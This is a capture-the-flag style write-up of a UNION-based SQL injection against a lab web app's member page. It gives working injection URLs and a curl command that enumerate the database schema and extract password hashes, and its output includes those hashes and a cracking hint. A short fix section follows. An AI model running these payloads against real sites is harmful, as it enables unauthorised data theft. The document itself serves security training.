Vulnerability 11
------

we need to put an UNION and 2 parameters to match with 'first name' and 'surname'   
`http://10.11.200.162//?page=member&id=5%20UNION%20SELECT%20NULL,NULL&Submit=Submit`

We got:
```
ID: 5 UNION SELECT NULL,NULL 
First name: Flag
Surname : GetThe
ID: 5 UNION SELECT NULL,NULL 
First name: 
Surname :
```

### Get columns name
Execute `curl "http://10.11.200.162/?page=member&id=5 UNION SELECT table_name,column_name from information_schema.COLUMNS --&Submit=Submit" |  sed  's/<br>/\n/g' | sed 's/<pre>/\n/g' | grep "name:\|Surname"`

We got:
```
[...]
Surname : IS_OLD
First name: INNODB_BUFFER_PAGE_LRU
Surname : FREE_PAGE_CLOCK
First name: db_default
Surname : id
First name: db_default
Surname : username
First name: db_default
Surname : password
First name: users
Surname : user_id
First name: users
Surname : first_name
First name: users
Surname : last_name
First name: users
Surname : town
First name: users
Surname : country
First name: users
Surname : planet
First name: users
Surname : Commentaire
First name: users
Surname : countersign
First name: guestbook
Surname : id_comment
First name: guestbook
Surname : comment
First name: guestbook
Surname : name
First name: list_images
Surname : id
First name: list_images
Surname : url
First name: list_images
Surname : title
First name: list_images
Surname : comment
First name: vote_dbs
Surname : id_vote
```

### Get countersign
Execute: `http://10.11.200.162/?page=member&id=5 UNION SELECT commentaire,countersign from Member_Sql_Injection.users &Submit=Submit`   

We got:
```
ID: 5 UNION SELECT commentaire,countersign from Member_Sql_Injection.users  
First name: Flag
Surname : GetThe
ID: 5 UNION SELECT commentaire,countersign from Member_Sql_Injection.users  
First name: Amerca !
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9
ID: 5 UNION SELECT commentaire,countersign from Member_Sql_Injection.users  
First name: Ich spreche kein Deutsch.
Surname : 60e9032c586fb422e2c16dee6286cf10
ID: 5 UNION SELECT commentaire,countersign from Member_Sql_Injection.users  
First name: ????? ????????????? ?????????
Surname : e083b24a01c483437bcf4a9eea7c1b4d
ID: 5 UNION SELECT commentaire,countersign from Member_Sql_Injection.users  
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

We need to MD5 decrypt the password, lower the char and hash256 it !

### Resolv ?
Always user prepared requests, where only field or value can be enter
Always addslash all user input
Remove javascript too
